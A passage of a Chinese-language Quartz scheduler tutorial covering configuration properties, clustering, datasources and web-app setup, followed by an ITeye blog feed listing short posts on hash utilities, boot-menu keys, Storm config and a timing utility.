scheduler.start(); 用指定的属性文件初始化： SchedulerFactory sf = new StdSchedulerFactory(); sf.initialize(fileName);//属性文件全名 Scheduler scheduler = sf.getScheduler(); scheduler.start(); DirectSchedulerFactoryDirectSchedulerFactory是另外的一个SchedulerFactory实现。在更多的编程方法里创建调度器时，他很有用。他的用法不被赞成，原因有：1.它需要用户更清楚的知道他们在做什么。2.它不允许配置，就是说，你必须要在代码里配置所有的调度器属性。 LoggingQuartz给它所有需要的日志是使用org.apache.commons.logging框架的。Quartz没有产生很多的日志信息。仅有一些在初始化时关于一些jobs正在执行的问题的信息。为了调整日志设置，我们需要了解Jakarta Commons Logging框架，超过了本文档讨论的范围。 11.高级(企业)特性集群目前集群仅以JDBC-Jobstore (JobStoreTX or JobStoreCMT)工作。这些特性包含load-balancing和任务fail-over（如果JobDetail的”request recovery”标志设为true的话）。 通过设置org.quartz.jobStore.isClustered属性为“true”来使用集群。在集群里的每个调度器实例应该用一样的 quartz.properties文件。集群会有如下异常：线程池大小不同，属性org.quartz.scheduler.instanceName 值不同。其实在集群的每个节点都有一个唯一的实例ID，要达到这样也很简单，也不需要不同的属性文件，只要将属性org.quartz.scheduler.instanceId的值设置为“AUTO”。 不要在一个分离开的机器上运行集群，除非他们的时钟是用时钟 同步服务同步过的。如果不熟悉怎样同步，参考：http://www.boulder.nist.gov/timefreq/service/its.htm 其他调度器实例在用数据表时，不要触发一个也用到这些数据表 的不是集群的调度器实例。你会得到一些没用的数据。 JTA 事务在第9节解释过JobStores，JobStoreCMT允许Quartz调度一些具有很大JTA事务的操作。 通过设置“org.quartz.scheduler.wrapJobExecutionInUserTransaction”属性为 true，Jobs也能够在一个JTA事务里执行。有了这个设置，一个JTA事务会在job的execute()方法调用前开始（begin），然后在调用execute()方法结束后提交（commit）。 除了在JTA事 务里Quartz自动地和job的执行挂钩之外，当使用JobStoreCMT时也可以调用你在调度器接口里的实现的方法，确保你在调用一个调度器上的方法之前开始了事务。你也可以直接自己做，使用UserTransaction，或者把用了调度器的代码放在一个使用容器的SessionBean里来管理事务。 12. Quartz 的其他特性Plug-InsQuartz 提供了一个接口(org.quartz.spi.SchedulerPlugin) 来实现plugging-in 的功能。 装配给Quartz的Plugins能提供不同的有用的功能。在org.quartz.plugins包里有详细说明。他们提供的功能例如：调度器启动时自动调度jobs，记录job和triggers事件的历史，当JVM退出时确保调度器关闭。 可以通过配置属性文件来使用自己实现或Quartz自带的插件。 JobFactory当一个trigger触发时，通过一个配置到调度器上的JobFactory，与trigger相关的job就被实例化了。默认的 JobFactory会在job类上调用newInstance()，你可能想要创建自己的JobFactory实现来完成一些其他的事情，如：拥有应用程序的IoC或者DI容器进程/初始化job实 例。 与Scheduler.setJobFactory(fact)方法联合起来察看org.quartz.spi.JobFactory接口， Jobs工具Quartz也提供一些有用的job，你能够用这些job来发邮件或者调用EJB。我们能在org.quartz.jobs包里找到它们。 13.配置文件里配置项总结设置主要调度器属性名 必须 类型 缺省值 org.quartz.scheduler.instanceName no string ‘QuartzScheduler’ org.quartz.scheduler.instanceId no string ‘NON_CLUSTERED’ org.quartz.scheduler.threadName no string instanceName + ‘_QuartzSchedulerThread’ org.quartz.scheduler.idleWaitTime no long 30000 org.quartz.scheduler.dbFailureRetryInterval no long 15000 org.quartz.scheduler.classLoadHelper.class no string (class name) org.quartz.simpl.CascadingClassLoadHelper org.quartz.context.key.SOME_KEY no string none org.quartz.scheduler.userTransactionURL no string (url) ‘java:comp/UserTransaction’ org.quartz.scheduler.wrapJobExecutionInUserTransaction no booelan false org.quartz.scheduler.jobFactory.class no string (class name) org.quartz.simpl.SimpleJobFactory  org.quartz.scheduler.instanceName任意的String，对于调度器自己并没有意义。但是当多个调度器实例用在一个程序里时，他就可以用来为客户端代码区别每个调度器。如果你用集群这个特性，你必须为在集群里的每个实例用一样的名字，实现逻辑上的一样的调度器。 org.quartz.scheduler.instanceId任意的String，如果在一个集群里多个实例是一个逻辑上一样的调度器时，每个实例的这项属性必须唯一。你可以设置这项为“AUTO”从而自动收集ID。 org.quartz.scheduler.idleWaitTime当调度器空闲时，在再次查询可用triggers之前，调度器将要等等待的毫秒数。正常情况下，我们不调整这个参数，除非我们用XA事务，或者在立即触发trigger时结果延误了。 org.quartz.scheduler.classLoadHelper.class不需要更改。 org.quartz.context.key.SOME_KEY 设置org.quartz.context.key.MyKey = MyValue等价于scheduler.getContext().put(“MyKey”, “MyValue”) org.quartz.scheduler.userTransactionURL是一个JNDI URL，Quartz用它来定位应用服务器的UserTransaction管理器。Websphere用户可能需要设置它为“jta/usertransaction”。在Quartz配置用到JobStoreCMT时并且属性org.quartz.scheduler.wrapJobExecutionInUserTransaction设置为true时才有用。 org.quartz.scheduler.wrapJobExecutionInUserTransaction设置这项为true使我们在调用job的execute（）之前能够开始一个UserTransaction。在job的execute（）完成之后，事务将会提交，并且，JobDataMap也更新了（是有状态的job）。 设置线程池属性名 必须 类型 缺省值 org.quartz.threadPool.class yes string (clas name) null org.quartz.threadPool.threadCount yes int -1 org.quartz.threadPool.threadPriority no int Thread.NORM_PRIORITY (5) org.quartz.threadPool.makeThreadsDaemons no boolean false org.quartz.threadPool.threadsInheritGroupOfInitializingThread no boolean true org.quartz.threadPool.threadsInheritContextClassLoaderOfInitializingThread no boolean false  org.quartz.threadPool.class通常使用org.quartz.simpl.SimpleThreadPool org.quartz.threadPool.threadPriority在 Thread.MIN_PRIORITY (1) 和Thread.MAX_PRIORITY (10)之间 org.quartz.threadPool.makeThreadsDaemons、org.quartz.threadPool.threadsInheritGroupOfInitializingThread 和org.quartz.threadPool.threadsInheritContextClassLoaderOfInitializingThread 三 个属性是指定的SimpleThreadPool的属性。 如果用自己实现的线程池，可如下配置： org.quartz.threadPool.class = com.mycompany.goo.FooThreadPool org.quartz.threadPool.somePropOfFooThreadPool = someValue 设置全局监听器全局监听器要有一个无参数的构造器，它的属性是通过反射设置的，仅支持简单数据和String。 Trigger监听器： org.quartz.triggerListener.NAME.class = com.foo.MyListenerClass org.quartz.triggerListener.NAME.propName = propValue org.quartz.triggerListener.NAME.prop2Name = prop2Value job监听器： org.quartz.jobListener.NAME.class = com.foo.MyListenerClass org.quartz.jobListener.NAME.propName = propValue org.quartz.jobListener.NAME.prop2Name = prop2Value 设置Plugins配置自己的插件（和全局监听器差不多）： org.quartz.plugin.NAME.class = com.foo.MyPluginClass org.quartz.plugin.NAME.propName = propValue org.quartz.plugin.NAME.prop2Name = prop2Value 也可以配置Quartz实现的插件： 1.trigger历史日志记录插件（属性配置中的{数字}参考JavaDoc）： org.quartz.plugin.triggHistory.class=org.quartz.plugins.history.LoggingTriggerHistoryPlugin org.quartz.plugin.triggHistory.triggerFiredMessage= Trigger {1}.{0} fired job {6}.{5} at:{4, date, HH:mm:ss MM/dd/yyyy} org.quartz.plugin.triggHistory.triggerCompleteMessage = Trigger {1}.{0} completed firing job {6}.{5} at {4, date, HH:mm:ss MM/dd/yyyy} 2.从XML文件中初始化job的插件（属性配置中的文件名是加载jobs用到的xml文件,这个文件必须在classPath里）： org.quartz.plugin.jobInitializer.class = org.quartz.plugins.xml.JobInitializationPlugin org.quartz.plugin.jobInitializer.fileName =data/my_job_data.xml org.quartz.plugin.jobInitializer.overWriteExistingJobs = false org.quartz.plugin.jobInitializer.failOnFileNotFound = true 在上例中，JobInitializationPlugin只支持一个xml文件的初始化，Quartz还提供多个xml文件的初始化，用JobInitializationPluginMultiple，文件名用“,”隔开。 含有多个Jobs的一个xml文件的一个例子: <?xml version=’1.0′ encoding=’utf-8′?> <quartz xmlns=”http://www.opensymphony.com/quartz/JobSchedulingData” xmlns:xsi=”http://www.w3.org/2001/XMLSchema-instance” xsi:schemaLocation=”http://www.opensymphony.com/quartz/JobSchedulingData http://www.opensymphony.com/quartz/xml/job_scheduling_data_1_5.xsd” version=”1.5″> <calendar class-name=”org.quartz.impl.calendar.HolidayCalendar” replace=”true”> <name>holidayCalendar</name> <description>HolidayCalendar</description> <base-calendar class-name=”org.quartz.impl.calendar.WeeklyCalendar”> <name>weeklyCalendar</name> <description>WeeklyCalendar</description> <base-calendar class-name=”org.quartz.impl.calendar.AnnualCalendar”> <name>annualCalendar</name> <description>AnnualCalendar</description> </base-calendar> </base-calendar> </calendar> <job> <job-detail> <name>testJob1</name> <group>testJobs</group> <description>Test Job Number 1</description> <job-class>personal.ruanyang.quartz.plugin.SimpleJob</job-class> <volatility>false</volatility> <durability>false</durability> <recover>false</recover> <job-data-map allows-transient-data=”true”> <entry> <key>test1</key> <value>test1</value> </entry> <entry> <key>test2</key> <value>test2</value> </entry> </job-data-map> </job-detail> <trigger> <cron> <name>testTrigger1</name> <group>testJobs</group> <description>Test Trigger Number 1</description> <job-name>testJob1</job-name> <job-group>testJobs</job-group> <!– <start-time>2003-12-17 2:15:00 pm</start-time> <end-time>2013-12-17 2:15:00 pm</end-time> –> <cron-expression>0/15 * * ? * *</cron-expression> <!– every 15 seconds… –> </cron> </trigger> </job> <job> <job-detail> <name>testJob2</name> <group>testJobs</group> <description>Test Job Number 2</description> <job-class>personal.ruanyang.quartz.plugin.SimpleJob</job-class> <volatility>false</volatility> <durability>false</durability> <recover>false</recover> </job-detail> <trigger> <simple> <name>testTrigger2</name> <group>testJobs</group> <description>Test Trigger Number 2</description> <calendar-name>holidayCalendar</calendar-name> <job-name>testJob2</job-name> <job-group>testJobs</job-group> <start-time>2004-02-26T12:26:00</start-time> <repeat-count>10</repeat-count> <repeat-interval>5000</repeat-interval> </simple> </trigger> </job> </quartz> 3.Shutdown Hook（通过捕捉JVM关闭时的事件，来关闭调度器）插件： org.quartz.plugin.shutdownhook.class = org.quartz.plugins.management.ShutdownHookPlugin org.quartz.plugin.shutdownhook.cleanShutdown = true 设置RMIRMI Server Scheduler Properties 没有必需的主要属性，所有的都是合理的缺省的。通过RMI使用Quartz时，我们需要启动一个配置好了的Quartz实例来通过RMI“输出”它的服务。然后我们通过配置Quartz的调度器创建一个客户端来“代理”它连到服务器上的工作。 一些用户在客户端和服务器端经历过类可用性（jobs classes）的问题，为了解决这些问题，我们需要理解RMI的“codebase”和RMI的安全管理。以下资源在这方面会很有用： RMI和codebase的精彩描叙：http://www.kedwards.com/jini/codebase.html 重要的一点要意识到，codebase是被客户端使用的。 安全管理的快速信息：http://gethelp.devx.com/techtips/java_pro/10MinuteSolutions/10min0500.asp 最后读来自于java API文档的RMISecurityManager： http://java.sun.com/j2se/1.4.2/docs/api/java/rmi/RMISecurityManager.html 属性名 需要 缺省值 org.quartz.scheduler.rmi.export no false org.quartz.scheduler.rmi.registryHost no ‘localhost’ org.quartz.scheduler.rmi.registryPort no 1099 org.quartz.scheduler.rmi.createRegistry no ‘never’ org.quartz.scheduler.rmi.serverPort no random org.quartz.scheduler.rmi.proxy no false  org.quartz.scheduler.rmi.export 如果我们想要Quartz调度器通过RMI输出服务，那么我们就把“rmi.export”标志执为true。 org.quartz.scheduler.rmi.registryHost能够找到的RMI注册的主机（常为“localhost”）。 org.quartz.scheduler.rmi.registryPortRMI注册的监听端口(常为1099). org.quartz.scheduler.rmi.createRegistry设置“rmi.createRegistry” 依照我们想要Quartz怎样创建RMI注册。如果我们不想Quartz创建一个注册，就可以用“false”或“never”（如已经有了一个外部的注册在运行了）。如果我们想先要Quartz尝试使用一个存在的注册并且然后返回再建一个，就用“true”或者“as_needed”。如果我们想要 Quartz尝试创建一个注册然后返回使用一个存在的，就用“always”。如果注册被创建，它将会绑定属性 “org.quartz.scheduler.rmi.registryPort”提供的端口，“org.quartz.rmi.registryHost”应该是主机。 org.quartz.scheduler.rmi.serverPortQuartz调度器服务将绑定和监听连接的端口。缺省的，RMI服 务将随机选择一个端口。 org.quartz.scheduler.rmi.proxy如果想要连接到远程的调度器服务，我们就要设置“org.quartz.scheduler.rmi.proxy”为true。然后必需指定一个主机和它注册了的端口号。 在同一个文件里给“org.quartz.scheduler.rmi.export”和 “org.quartz.scheduler.rmi.proxy”同时设置为true并没有意义。如果你这样做的话，“export”项会被忽略。如果你没有通过RMI用Quartz，给这两项同时设置为false当然也没有用。 设置RAMJobStoreRAMJobStore用来在内存里储存调度时的信息（job，trigger，calendars）。RAMJobStore很快并且是轻量级的，但是当进程终止时所有的信息都将丢失。 通过设置“org.quartz.jobStore.class”属性来选用RAMJobStore： org.quartz.jobStore.class = org.quartz.simpl.RAMJobStore RAMJobStore 能够通过下面的属性来调整： 属性名 需要 类型 缺省值 org.quartz.jobStore.misfireThreshold no int 60000  org.quartz.jobStore.misfireThreshold在触发器被认为没有触发之前，调度器能承受一个触发器再次触发的一个毫秒级数字。 设置JDBC-JobStoreTXJobStoreTX是在每次行为（如增加一个job） 之后，通过调用commit() (或者 rollback())来管理事务。如果你在一个单机应用里或者当在一个servlet容器里用Quartz而且应用没有用JTA事务时，JDBCJobStore是正确的。 JobStoreTX是通过设置“org.quartz.jobStore.class”属性来选用的： org.quartz.jobStore.class = org.quartz.impl.jdbcjobstore.JobStoreTX JobStoreTX能够通过以下属性来调整： 属性名 必须 类型 缺省值 org.quartz.jobStore.driverDelegateClass yes string null org.quartz.jobStore.dataSource yes string null org.quartz.jobStore.tablePrefix no string “QRTZ_” org.quartz.jobStore.useProperties no boolean false org.quartz.jobStore.misfireThreshold no int 60000 org.quartz.jobStore.isClustered no boolean false org.quartz.jobStore.clusterCheckinInterval no long 15000 org.quartz.jobStore.maxMisfiresToHandleAtATime no int 20 org.quartz.jobStore.dontSetAutoCommitFalse no boolean false org.quartz.jobStore.selectWithLockSQL no string “SELECT * FROM {0}LOCKS WHERE LOCK_NAME = ? FOR UPDATE” org.quartz.jobStore.txIsolationLevelSerializable no boolean false  org.quartz.jobStore.driverDelegateClass org.quartz.impl.jdbcjobstore.StdJDBCDelegate (所有JDBC兼容的驱动) org.quartz.impl.jdbcjobstore.MSSQLDelegate (Microsoft SQL Server和Sybase) org.quartz.impl.jdbcjobstore.PostgreSQLDelegate org.quartz.impl.jdbcjobstore.WebLogicDelegate (WebLogic驱动) org.quartz.impl.jdbcjobstore.oracle.OracleDelegate org.quartz.impl.jdbcjobstore.oracle.WebLogicOracleDelegate (用在Weblogic里的Oracle驱动) org.quartz.impl.jdbcjobstore.oracle.weblogic.WebLogicOracleDelegate (用在Weblogic里的Oracle驱动) org.quartz.impl.jdbcjobstore.CloudscapeDelegate org.quartz.impl.jdbcjobstore.DB2v6Delegate org.quartz.impl.jdbcjobstore.DB2v7Delegate org.quartz.impl.jdbcjobstore.HSQLDBDelegate org.quartz.impl.jdbcjobstore.PointbaseDelegate org.quartz.jobStore.misfireThreshold同RAM org.quartz.jobStore.clusterCheckinInterval影响着核查出失败实例的速度。 org.quartz.jobStore.dontSetAutoCommitFalse设置这个属性为“true”是让Quartz不去在JDBC连接上调用setAutoCommit(false)这个函数。 org.quartz.jobStore.selectWithLockSQL在“LOCKS”表里选择一行并且锁住这行的SQL语句。缺省的语句能够为大部分数据库工作。“{0}” 是在运行时你配置的表前缀。 org.quartz.jobStore.txIsolationLevelSerializable设置“true”让Quartz（当用JobStoreTX或CMT）在JDBC连接上调用 setTransactionIsolation(Connection.TRANSACTION_SERIALIZABLE)。这可以阻止数据库在高加载或长时间的事务情况下的锁超 时。 设置JDBC-JobStoreCMTJobStoreCMT是依赖与被用Quartz的应用管理着的事务。JTA事务必须在尝试调度（或卸载调度）jobs/triggers之前处在进程中。这允许调度工作成为应用加大事务的一部分。JobStoreCMT实际上需要用到两个数据源，一个数据源要连到被应用服务器管理的事务（通过 JTA）， 另外一个数据源的连接在全局（JTA）事务中并不参加。当应用用JTA事 务（例如通过EJB Session Beans）来执行他们的工作时，JobStoreCMT是正确的。 通过设置 ‘org.quartz.jobStore.class’属性来选用JobStore: org.quartz.jobStore.class = org.quartz.impl.jdbcjobstore.JobStoreCMT JobStoreCMT通过以下属性来调整： 属性名 必须 类型 缺省值 org.quartz.jobStore.driverDelegateClass yes string null org.quartz.jobStore.dataSource yes string null org.quartz.jobStore.nonManagedTXDataSource yes string null org.quartz.jobStore.tablePrefix no string “QRTZ_” org.quartz.jobStore.useProperties no boolean false org.quartz.jobStore.misfireThreshold no int 60000 org.quartz.jobStore.isClustered no boolean false org.quartz.jobStore.clusterCheckinInterval no long 15000 org.quartz.jobStore.maxMisfiresToHandleAtATime no int 20 org.quartz.jobStore.dontSetAutoCommitFalse no boolean false org.quartz.jobStore.dontSetNonManagedTXConnectionAutoCommitFalse no boolean false org.quartz.jobStore.selectWithLockSQL no string “SELECT * FROM {0}LOCKS WHERE LOCK_NAME = ? FOR UPDATE” org.quartz.jobStore.txIsolationLevelSerializable no boolean false org.quartz.jobStore.txIsolationLevelReadCommitted no boolean false  org.quartz.jobStore.dataSource 对于JobStoreCMT，数据源需要包含能够加入JTA（容器管理）事务里的连接。这就意味着数据源将在应用服务器里被配置和管理，并且，Quartz将通过JNDI获得一个句柄。 org.quartz.jobStore.nonManagedTXDataSource JobStoreCMT需要一个数据源（以上说的第二个）连到不是容器管理的事务。这个值将是定义在配置属性文件的一个数据源名称，这个数据源必须包含非CMT的连接，换句话说，就是Quartz直接在连接上调用commit()和rollback()。 org.quartz.jobStore.dontSetNonManagedTXConnectionAutoCommitFalse除了它应用于非TX数据源管理，其他的和org.quartz.jobStore.dontSetAutoCommitFalse一样 org.quartz.jobStore.txIsolationLevelReadCommitted设置“true”，让Quartz在没有被管理的JDBC连接上调用setTransactionIsolation(Connection.TRANSACTION_READ_UNCOMMITTED)。这可以阻止一些数据库（如DB2）在高加载和长 时间事务的情况下发生的锁超时。 设置数据源如果你用JDBC-JobStore，你将需要一个数据源（或在JobStoreCMT里要2个）。 数据源能通过2种 方法配置： Quartz搜集所有指定在quartz.properties 文件 里的属性来创建数据源。 指定一 个定位于管理数据源的应用服务器的JNDI，这样Quartz能用它。 每个定义的数据源必须有个名字，你为这个数据源定义的一些属性必须包含这个名字，象下面的。数据源的“NAME”可以随便取，只有当我们把数据源赋给JDBCJobStore时，这个名字起到标示的作用，其他情况下没什么用。 Quartz自己创建数据源通过以下属性： 属性名 必须 类型 缺省值 org.quartz.dataSource.NAME.driver yes String null org.quartz.dataSource.NAME.URL yes String null org.quartz.dataSource.NAME.user no String “” org.quartz.dataSource.NAME.password no String “” org.quartz.dataSource.NAME.maxConnections no int 10 org.quartz.dataSource.NAME.validationQuery no String null  org.quartz.dataSource.NAME.validationQuery是一个可选的SQL查询字符串，数据源用它来核查和替代失败/被 破坏的连接。例如，一个Oracle用户可能选择“select table_name from user_tables”-这 是一个决不可能失败的查询，除非连接是坏的。 org.quartz.dataSource.myDS.driver = oracle.jdbc.driver.OracleDriver org.quartz.dataSource.myDS.URL = jdbc:oracle:thin:@10.0.1.23:1521:demodb org.quartz.dataSource.myDS.user = myUser org.quartz.dataSource.myDS.password = myPassword org.quartz.dataSource.myDS.maxConnections = 30 引用应用服务器的数据源： 属性值 必须 类型 缺省值 org.quartz.dataSource.NAME.jndiURL yes String null org.quartz.dataSource.NAME.java.naming.factory.initial no String null org.quartz.dataSource.NAME.java.naming.provider.url no String null org.quartz.dataSource.NAME.java.naming.security.principal no String null org.quartz.dataSource.NAME.java.naming.security.credentials no String null  org.quartz.dataSource.NAME.java.naming.factory.initialJNDI上下文初始化工厂的类名。 org.quartz.dataSource.NAME.java.naming.provider.url连接到JNDI上下文的URL。 org.quartz.dataSource.NAME.java.naming.security.principal连接到JNDI上下文的首要用户。 org.quartz.dataSource.NAME.java.naming.security.credentials连接到JNDI上下文的用户验证密码。 org.quartz.dataSource.myOtherDS.jndiURL=jdbc/myDataSource org.quartz.dataSource.myOtherDS.java.naming.factory.initial= com.evermind.server.rmi.RMIInitialContextFactory org.quartz.dataSource.myOtherDS.java.naming.provider.url=ormi://localhost org.quartz.dataSource.myOtherDS.java.naming.security.principal=admin org.quartz.dataSource.myOtherDS.java.naming.security.credentials=123 设置集群集群可以通过fail-over和load balancing功能给调度器带来既高可靠性又可伸缩性两大优点。 集群目前仅能和JDBC-JobStore（JobStoreTX或JobStoreCMT）一起工作，本质上是让集群的每个节点共享一个数据库来工作的。 Load-balancing是自动出现的，集群的每个节点尽可能快地触发job。当一个触发器触发时刻到了，第一个将获取触发器（并加锁）的节点就是将要触发它的节点。 Fail-over是一个节点正在执行一个或多个jobs时失败了出现的。当一个节点失败了，其他的节点就会在数据库里核查条件和鉴别jobs，这些是节点失败时记录到了数据库的。在恢复节点时，任何标记了恢复（JobDetail里的”requests recovery”属性）的jobs将会被再次执行，没有标记的将会简单地释放掉。 通过设置“org.quartz.jobStore.isClustered”属性来使用集群。在集群里每个实例应该用一样的 quartz.properties文件。用到的异常也应该是一样的：不同线程池大小，不同 “org.quartz.scheduler.instanceName”属性值。每个节点应该用唯一的instanceId。我们可以设置 org.quartz.scheduler.instanceId的值为“AUTO”来达到这个目的。 不要在一个分离开的机器上运行集群，除非他们的时钟是用时钟 同步服务同步过的。如果不熟悉怎样同步，参考：http://www.boulder.nist.gov/timefreq/service/its.htm 其他实例在用数据表时，不要触发一个不是集群的也用这些数据表的实 例。你会得到一些没用的数据。 #=================================================================# Configure Main Scheduler Properties #=================================================================org.quartz.scheduler.instanceName = MyClusteredScheduler org.quartz.scheduler.instanceId = AUTO #=================================================================# Configure ThreadPool #================================================================= org.quartz.threadPool.class = org.quartz.simpl.SimpleThreadPool org.quartz.threadPool.threadCount = 25 org.quartz.threadPool.threadPriority = 5 #=================================================================# Configure JobStore #================================================================= org.quartz.jobStore.misfireThreshold = 60000 org.quartz.jobStore.class = org.quartz.impl.jdbcjobstore.JobStoreTX org.quartz.jobStore.driverDelegateClass=org.quartz.impl.jdbcjobstore.oracle.OracleDelegate org.quartz.jobStore.useProperties = false org.quartz.jobStore.dataSource = myDS org.quartz.jobStore.tablePrefix = QRTZ_ org.quartz.jobStore.isClustered = true org.quartz.jobStore.clusterCheckinInterval = 20000 #================================================================= # Configure Datasources #================================================================= org.quartz.dataSource.myDS.driver = oracle.jdbc.driver.OracleDriver org.quartz.dataSource.myDS.URL = jdbc:oracle:thin:@polarbear:1521:dev org.quartz.dataSource.myDS.user = quartz org.quartz.dataSource.myDS.password = quartz org.quartz.dataSource.myDS.maxConnections = 5 org.quartz.dataSource.myDS.validationQuery=select 0 from dual 14.在Web应用中用Quartz初始化调度器我们可以在Web应用中的配置文件web.xml里设置一个Quartz的Servlet-QuartzInitializerServlet： <web-app> <servlet> <servlet-name>QuartzInitializer</servlet-name>  <display-name>Quartz Initializer Servlet</display-name><servlet-class>    org.quartz.ee.servlet.QuartzInitializerServlet   </servlet-class>  <load-on-startup>1</load-on-startup>  <init-param>    <param-name>config-file</param-name>    <param-value>/some/path/my_quartz.properties</param-value>  </init-param>  <init-param>    <param-name>shutdown-on-unload</param-name>    <param-value>true</param-value>  </init-param>  <init-param>    <param-name>start-scheduler-on-load</param-name>    <param-value>true</param-value>  </init-param> </servlet> <!-- other web.xml items here --></web-app> 说明：config-file参数值是StdSchedulerFactory用来实例化调度器的，可以把自己写的Quartz属性文件放在classPath即WEB-INF/classes路径下。 访问调度器从Quartz1.5开始，QuartzInitializerServlet将自动储存StdSchedulerFactory实例在ServletContext里： // 从Session中获得ServletContext ServletContext ctx = request.getSession().getServletContext(); // 从ServletContext中获得StdSchedulerFactory StdSchedulerFactory factory = (StdSchedulerFactory)ctx.getAttribute( QuartzFactoryServlet.QUARTZ_FACTORY_KEY); // 从StdSchedulerFactory中获得Scheduler Scheduler scheduler = factory.getScheduler(); // 启动Scheduler scheduler.start(); FAQ1.       怎样控制Job实例？ 看看org.quartz.spi.JobFactory 和 the org.quartz.Scheduler.setJobFactory(..) 方法。 2.       在一个job完成之后，我怎样阻止它被删 掉？ 设置JobDetail.setDurability(true)-当job是一个“孤儿”（没有trigger引用这个job）时，这将指示Quartz不要删掉它。 3.       怎样阻止job并行触发？ 使job类实现StatefulJob接口而不是job接 口。察看StatefulJob 的JavaDoc。 4.       怎样使一个正在执行的job停 下来？ 看看org.quartz.InterruptableJob接口和Scheduler.interrupt(String, String)方法。   5. 怎样使Jobs的执行串联起来？ 有两个方法： 一、用监听器 二、用JobDataMap 6.       怎样提高JDBC-JobStore的性能？ 除了硬件的提高外，我们可以给我们建的Quartz表建索引： create index idx_qrtz_t_next_fire_time on qrtz_triggers(NEXT_FIRE_TIME); create index idx_qrtz_t_state on qrtz_triggers(TRIGGER_STATE); create index idx_qrtz_t_nf_st on qrtz_triggers(TRIGGER_STATE,NEXT_FIRE_TIME); create index idx_qrtz_ft_trig_name on qrtz_fired_triggers(TRIGGER_NAME); create index idx_qrtz_ft_trig_group on qrtz_fired_triggers(TRIGGER_GROUP); create index idx_qrtz_ft_trig_name on qrtz_fired_triggers(TRIGGER_NAME); create index idx_qrtz_ft_trig_n_g on qrtz_fired_triggers(TRIGGER_NAME,TRIGGER_GROUP); create index idx_qrtz_ft_trig_inst_name on qrtz_fired_triggers(INSTANCE_NAME); create index idx_qrtz_ft_job_name on qrtz_fired_triggers(JOB_NAME); create index idx_qrtz_ft_job_group on qrtz_fired_triggers(JOB_GROUP);   让你看看所有的经典宝贝，你值得拥有吗？ 女孩子高贵的象征，你喜欢吗？    
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
各种hash算法-hashcodeUtil, zhaoshijie.iteye.com.blog.2054158, Thu, 24 Apr 2014 15:36:28 +0800
关键字：各种hash算法-hashcodeUtil     让你看看所有的经典宝贝，你值得拥有吗？ 女孩子高贵的象征，你喜欢吗？   
    本文附件下载:
    
      hashcodeUtil.rar (1.4 MB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
各种品牌类型的主板  电脑开机启动选项快捷键, zhaoshijie.iteye.com.blog.2054042, Thu, 24 Apr 2014 11:57:12 +0800
关键字：各种品牌类型的主板  电脑开机启动选项快捷键  组装机主板  品牌笔记本 品牌台式机主板品牌 启动按键 笔记本品牌 启动按键 台式机品牌 启动按键华硕主板 F8 联想笔记本 F12 联想台式机 F12技嘉主板 F12 宏基笔记本 F12 惠普台式机 F12微星主板 F11 华硕笔记本 ESC 宏基台式机 F12映泰主板 F9 惠普笔记本 F9 戴尔台式机 ESC梅捷主板 ESC或F12 联想Thinkpad F12 神舟台式机 F12七彩虹主板 ESC或F11 戴尔笔记本 F12 华硕台式机 F8华擎主板 F11 神舟笔记本 F12 方正台式机 F12斯巴达卡主板 ESC 东芝笔记本 F12 清华同方台式机 F12昂达主板 F11 三星笔记本 F12 海尔台式机 F12双敏主板 ESC IBM笔记本 F12 明基台式机 F8翔升主板 F10 富士通笔记本 F12   精英主板 ESC或F11 海尔笔记本 F12   冠盟主板 F11或F12 方正笔记本 F12   富*士*康主板 ESC或F12 清华同方笔记本 F12   顶星主板 F11或F12 微星笔记本 F11   铭瑄主板 ESC 明基笔记本 F9   盈通主板 F8 技嘉笔记本 F12   捷波主板 ESC Gateway笔记本 F12   Intel主板 F6或F12 eMachines笔记本 F12   杰微主板 ESC或F8 索尼笔记本 ESC   致铭主板 F12     磐英主板 ESC     磐正主板 ESC     冠铭主板 F9      精品时尚包包，男女各种新款式，欢迎前来精品时尚包包，男女各种新款式，欢迎前来      让你看看所有的经典宝贝，你值得拥有吗？ 女孩子高贵的象征，你喜欢吗？   
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Oreilly.Getting.Started.with.Storm.中文版, zhaoshijie.iteye.com.blog.2041247, Fri, 04 Apr 2014 17:56:04 +0800
关键字：Oreilly.Getting.Started.with.Storm.中文版   理解storm分组：http://blog.csdn.net/ygc/article/details/18218727    让你看看所有的经典宝贝，你值得拥有吗？ 女孩子高贵的象征，你喜欢吗？   
    本文附件下载:
    
      Oreilly.Getting.Started.with.Storm.中文版.rar (1.3 MB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
storm集群配置（storm.yaml）, zhaoshijie.iteye.com.blog.2034554, Fri, 21 Mar 2014 15:15:36 +0800
关键字：storm集群配置（storm.yaml）  请从附件下载，此配置仅供参考，谢谢！！      让你看看所有的经典宝贝，你值得拥有吗？ 女孩子高贵的象征，你喜欢吗？   
    本文附件下载:
    
      storm.yaml_ganji.com-storm配置_.rar (564 Bytes)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
性能监控工具类（StopWatchUtil）, zhaoshijie.iteye.com.blog.2034550, Fri, 21 Mar 2014 15:12:32 +0800
关键字：性能监控工具类（StopWatchUtil）   附件是工具类，请下载使用。   使用方法如下：  public static void main(String[] args) throws InterruptedException {		StopWatchUtil stopWatch = new StopWatchUtil("测试过滤词导出功能性能消耗情况"); 		stopWatch.start("任务1");		Thread.sleep(2000); // simulated work		stopWatch.stop(); 		stopWatch.start("任务2");		Thread.sleep(5000); // simulated work		stopWatch.stop(); 		stopWatch.start("任务3");		Thread.sleep(3000); // simulated work		stopWatch.stop(); 		stopWatch.start("任务4");		Thread.sleep(1000); // simulated work		stopWatch.stop(); 		System.out.println(stopWatch.prettyPrint());  		System.out.println(stopWatch.toString());	}  
    本文附件下载:
    
      StopWatchUtil.rar (1.8 KB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Hashtable、synchronizedMap、ConcurrentHashMap 深度比较, zhaoshijie.iteye.com.blog.2030826, Fri, 14 Mar 2014 10:29:13 +0800
